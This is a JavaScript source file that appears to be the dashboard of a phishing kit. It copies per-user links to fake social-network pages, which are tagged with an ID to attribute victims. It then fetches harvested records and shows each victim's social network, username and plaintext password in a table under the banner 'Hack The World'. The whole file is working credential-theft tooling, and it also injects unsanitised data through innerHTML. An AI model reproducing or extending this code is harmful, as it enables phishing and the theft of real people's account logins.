import { dbUrl, domain } from "./variables.js";

const user = JSON.parse(sessionStorage.getItem("user"));


// getting user details from database

let userFromDb = await fetch(
  `${dbUrl}/users?name=${user.name}&email=${user.email}`
);
userFromDb = await userFromDb.json();
userFromDb = userFromDb[0];

// logout

let logoutLink = document.getElementById("logout-link");

logoutLink.addEventListener("click", () => {
  sessionStorage.removeItem("user");
  window.location.href = "./login.html";
});

// copy link to clip board

function copyStringToClipboard(str) {
  return new Promise((resolve, reject) => {
    // Create new element
    var el = document.createElement("textarea");
    el.value = str;

    el.setAttribute("readonly", "");
    el.style = { position: "absolute", left: "-9999px" };
    document.body.appendChild(el);

    // Select text inside element
    el.select();
    el.setSelectionRange(0, 99999);

    document.execCommand("copy"); // copy
    document.body.removeChild(el); // Remove temporary element

    resolve();
  });
}

let copyBtn = document.querySelector(".copy-btn");
copyBtn.addEventListener("click", (e) => {
  let social = e.target.getAttribute("data-social");
  let link = `${domain}/assets/pages/${social}/index.html?id=${userFromDb.id}`;

  copyStringToClipboard(link).then(() => {
    swal("Hack The World 🌎", "Link copied successfully", "success");
  });
});

// dom

document.getElementById("user-name").innerText = user.name;

// password database setup

const getUserDetail = async () => {
  let passwordDb = document.getElementById("password-db");

  let targets = await fetch(`${dbUrl}/hacker?userId=${userFromDb.id}`);
  targets = await targets.json();

  targets.map((victim) => {
    passwordDb.innerHTML += `
      <tr>
        <th scope="row">🤵</th>
        <td>${victim.social}</td>
        <td>${victim.username}</td>
        <td>${victim.password}</td>
      </tr>
    `;
  });
};

getUserDetail();
